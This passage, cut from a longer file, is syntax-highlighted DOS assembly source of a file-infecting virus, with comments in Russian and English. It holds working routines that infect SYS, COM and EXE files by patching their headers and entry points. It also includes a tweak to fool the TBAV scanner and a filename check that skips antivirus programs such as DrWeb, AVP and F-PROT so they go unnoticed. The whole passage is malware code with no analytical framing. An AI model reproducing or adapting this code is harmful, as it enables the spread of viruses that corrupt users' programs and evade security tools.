       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_addr21</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; ds=0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io1</span><span class="sc0">         </span><span class="sc1">; восстановить 1-й вектор</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">nextcmd</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; выход из прерывания</span><span class="sc0">
       </span><span class="sc6">iret</span><span class="sc0">                    </span><span class="sc1">; трассировки</span><span class="sc0">

 </span><span class="sc1">; Verifyes MCB owner</span><span class="sc0">
 </span><span class="sc5">verifymcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">          </span><span class="sc1">; get current psp segment</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; get mcb segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">          </span><span class="sc1">; name of the owner</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">stdisable</span><span class="sc0">
 </span><span class="sc5">cmpchar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get char of the owner name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upreg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nextname</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">the_same</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">the_same</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cmpchar</span><span class="sc0">
  </span><span class="sc5">nextname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nextname</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">the_different</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cmpchar</span><span class="sc0">
 </span><span class="sc5">the_same</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">quitvmcb</span><span class="sc0">
 </span><span class="sc5">the_different</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">quitvmcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; sys infection ── called by infect, [di] = buffer</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">sysinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cierr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cierr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">65035</span><span class="sc4">-</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">cierr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">strategy</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">old_strategy</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; com infection ── called by infect, [di] = buffer</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">cominfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cierr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cierr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">65035</span><span class="sc4">-</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">cierr</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">cierr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; exe infection ── called by infect, [di] = buffer</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">exeinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc12">'@'</span><span class="sc0">   </span><span class="sc1">; NExe?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exerr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                  </span><span class="sc1">; get file size from header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">                </span><span class="sc1">; and the real size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; compare its</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exerr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exerr</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; get location in exe file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; special for TBAV</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">3000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">                </span><span class="sc1">; get pages/lst page lenght</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">exerr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Тестирует файл на предмет незаражаемости + виндоус изврат</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">filenamecheck</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pusha</span><span class="sc0">                  </span><span class="sc1">; сохранить регистры</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; si=dx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">; dec+inc=0</span><span class="sc0">
 </span><span class="sc5">findend</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">; найти конец</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">findend</span><span class="sc0">

 </span><span class="sc5">findname</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">; decrease si</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gotname</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gotname</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">findname</span><span class="sc0">
 </span><span class="sc5">gotname</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; si=filename</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get first chars</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upreg</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'IW'</span><span class="sc0">         </span><span class="sc1">; Windows?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">winfound</span><span class="sc0">

 </span><span class="sc5">otherfiles</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'IF'</span><span class="sc0">         </span><span class="sc1">; FindVirus?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CS'</span><span class="sc0">         </span><span class="sc1">; Scan?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SV'</span><span class="sc0">         </span><span class="sc1">; VSafe/VShield?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'BT'</span><span class="sc0">         </span><span class="sc1">; Fucked TBSCAN?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'RD'</span><span class="sc0">         </span><span class="sc1">; DRWEB?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'VA'</span><span class="sc0">         </span><span class="sc1">; AVP?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'-F'</span><span class="sc0">         </span><span class="sc1">; F-PROT?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'PF'</span><span class="sc0">         </span><span class="sc1">; FPROT?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'DA'</span><span class="sc0">         </span><span class="sc1">; ADInf?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">         </span><span class="sc1">; COMMAND interpreter?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">badfile</span><span class="sc0">

                        </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">; filename is okay</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">badfile</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">; bad file...</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">winfound</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">func_number</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">   </span><span class="sc1">; windows: EXECUTE?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">otherfiles</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; get second two chars</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upreg</span><span class="sc0">                  </span><span class="sc1">; uppercase</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'.N'</span><span class="sc0">                </span><span class="sc1">; wiN.?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">otherfiles</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get third two chars</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upreg</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">         </span><span class="sc1">; win.CO?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">otherfiles</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">; widows executing:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; offset of command line</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get segment =es=ds</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; ds:si=es:di=comline</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
